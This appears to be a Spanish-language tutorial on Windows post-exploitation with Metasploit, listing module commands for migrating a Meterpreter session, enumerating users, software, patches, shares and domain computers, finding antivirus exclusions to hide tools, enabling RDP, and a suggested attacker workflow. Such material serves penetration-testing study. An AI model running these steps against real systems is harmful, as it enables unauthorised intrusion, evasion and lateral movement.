# Post-Explotación en Windows con Metasploit

## Introducción

Una vez obtenida una sesión Meterpreter en una máquina Windows, Metasploit proporciona varios **módulos de post-explotación** que permiten recolectar información sensible del sistema, realizar movimientos laterales y establecer persistencia.

---

## 1. Migración a un proceso más estable

### Módulo: `windows/manage/migrate`

```bash
use post/windows/manage/migrate
set SESSION <id>
run
```

Este módulo **mueve la sesión Meterpreter a otro proceso**, idealmente uno más estable como `explorer.exe` para mejorar la persistencia y evitar que el payload muera si el proceso original se cierra.

---

## 2. Enumerar usuarios conectados

### Módulo: `post/windows/gather/enum_logged_on_users`

```bash
use post/windows/gather/enum_logged_on_users
set SESSION <id>
run
```

Este módulo **muestra los usuarios que están o han estado conectados** en la máquina, útil para identificar cuentas privilegiadas.

---

## 3. Detectar si estamos en una máquina virtual

### Módulo: `post/windows/gather/checkvm`

```bash
use post/windows/gather/checkvm
set SESSION <id>
run
```

Sirve para **identificar si la máquina víctima es una VM**, lo cual puede indicar que estás en un entorno de laboratorio o honeypot.

---

## 4. Enumerar aplicaciones instaladas

### Módulo: `post/windows/gather/enum_applications`

```bash
use post/windows/gather/enum_applications
set SESSION <id>
run
```

Este módulo lista **todas las aplicaciones instaladas**, útil para buscar software vulnerable o identificar el uso del sistema.

---

## 5. Usar el sistema de loot de Metasploit

Los resultados generados por los módulos anteriores se almacenan en el sistema de **loot** de Metasploit.

```bash
loot
```

Muestra los archivos descargados y datos recolectados en la sesión.

---

## 6. Ver exclusiones del antivirus

### Módulo: `post/windows/gather/enum_av_excluded`

```bash
use post/windows/gather/enum_av_excluded
set SESSION <id>
run
```

Muestra **carpetas, archivos y extensiones excluidas del escaneo del antivirus**, ideal para esconder herramientas o persistencia.

---

## 7. Enumerar otros equipos conectados

### Módulo: `post/windows/gather/enum_computers`

```bash
use post/windows/gather/enum_computers
set SESSION <id>
run
```

Este módulo intenta **descubrir otros ordenadores dentro del mismo dominio o red**.

---

## 8. Ver parches instalados

### Módulo: `post/windows/gather/enum_patches`

```bash
use post/windows/gather/enum_patches
set SESSION <id>
run
```

Permite saber **qué actualizaciones y parches tiene el sistema**, y por lo tanto, detectar vulnerabilidades no corregidas.

---

## 9. Enumerar carpetas compartidas

### Módulo: `post/windows/gather/enum_shares`

```bash
use post/windows/gather/enum_shares
set SESSION <id>
run
```

Busca **recursos compartidos en red (shares)** en el sistema, muy útil para **movimiento lateral** o acceso a archivos confidenciales.

---

## 10. Habilitar escritorio remoto (RDP)

### Módulo: `post/windows/manage/enable_rdp`

```bash
use post/windows/manage/enable_rdp
set SESSION <id>
run
```

Este módulo **activa el servicio RDP en el sistema víctima**, permitiendo el acceso remoto por escritorio si luego conoces las credenciales.

---

## Recomendación de flujo de trabajo

1. Migrar la sesión a `explorer.exe` con `migrate`.
2. Ejecutar módulos de recolección de usuarios, software y red.
3. Guardar toda la información con `loot`.
4. Explorar posibles caminos para persistencia o escalada de privilegios.
5. Habilitar RDP o generar nuevas sesiones si es necesario.

